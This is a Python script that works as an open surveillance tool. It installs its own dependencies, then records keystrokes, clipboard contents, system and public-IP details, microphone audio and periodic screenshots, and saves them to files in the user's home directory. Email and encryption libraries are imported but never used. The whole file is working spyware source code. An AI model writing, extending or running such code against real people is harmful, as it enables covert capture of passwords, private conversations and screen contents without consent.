import os
import subprocess
import sys
import importlib
import time
import threading  # To run the screenshot and audio capture concurrently

# Function to check if a package is installed
def is_package_installed(package_name):
    try:
        importlib.import_module(package_name)
        return True
    except ImportError:
        return False

# Function to install necessary libraries
def install_dependencies():
    try:
        # List of required packages
        required_packages = [
            "pynput",
            "cryptography",
            "sounddevice",
            "scipy",
            "pillow",
            "requests",
            "pywin32"
        ]
        
        for package in required_packages:
            if not is_package_installed(package):
                print(f"Installing {package}...")
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            else:
                print(f"{package} is already installed.")
        print("All dependencies checked/installed successfully.")
    except Exception as e:
        print(f"Error installing dependencies: {e}")
        sys.exit(1)

# Check and install dependencies
install_dependencies()

# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from PIL import ImageGrab

# File paths
file_path = os.path.expanduser("~")
if not os.path.exists(file_path):
    os.makedirs(file_path)

keys_information = os.path.join(file_path, "keylog.txt")  # File to store keys captured
system_information = os.path.join(file_path, "syseminfo.txt")  # System info
clipboard_information = os.path.join(file_path, "clipboard.txt")  # Clipboard data
audio_information = os.path.join(file_path, "audio.wav")  # Record and store mic data
screenshot_information = os.path.join(file_path, "screenshot.png")  # Screenshot

microphone_time = 10  # Audio recording duration in seconds
screenshot_interval = 10  # Time interval for taking screenshots (in seconds)
audio_interval = 10  # Time interval for recording audio (in seconds)

# Get the computer information
def computer_information():
    with open(system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)\n")

        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

# Get the clipboard contents
def copy_clipboard():
    with open(clipboard_information, "a") as f:
        try:
            if os.name == 'nt':  # Windows
                import win32clipboard
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
            else:  # Linux
                pasted_data = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], 
                                             capture_output=True, text=True).stdout
            f.write("Clipboard Data: \n" + pasted_data + '\n')
        except Exception:
            f.write("Clipboard could not be copied\n")


# Get the microphone recording
def microphone():
    while True:
        fs = 44100
        seconds = microphone_time
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write(audio_information, fs, myrecording)
        print(f"Audio recording saved at {audio_information}")
        time.sleep(audio_interval)

# Get a screenshot
def screenshot():
    while True:
        im = ImageGrab.grab()
        im.save(screenshot_information)
        print(f"Screenshot taken and saved at {screenshot_information}")
        time.sleep(screenshot_interval)

# Keylogger setup
count = 0
keys = []
currentTime = time.time()
SSTime = time.time() + 10
StoppingTime = time.time() + 15

def on_press(key):
    global keys  # Ensure the global keys variable is used
    print(key)
    keys.append(key)
    currentTime = time.time()

def write_file(keys):
    with open(keys_information, "a") as f:
        for key in keys:
            if key == Key.space:
                f.write('\n')
            elif key == Key.backspace:
                f.write('\b')
            else:
                k = str(key).replace("'", "")
                f.write(k)

def on_release(key):
    if key == Key.esc:
        write_file(keys)
        copy_clipboard()
        computer_information()
        return False

# Start the keylogger listener in a separate thread
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Start dependencies check
install_dependencies()

# Start the screenshot and audio capture threads
screenshot_thread = threading.Thread(target=screenshot, daemon=True)
audio_thread = threading.Thread(target=microphone, daemon=True)

# Start the threads
screenshot_thread.start()
audio_thread.start()

# Start the keylogger in the main thread
start_keylogger()
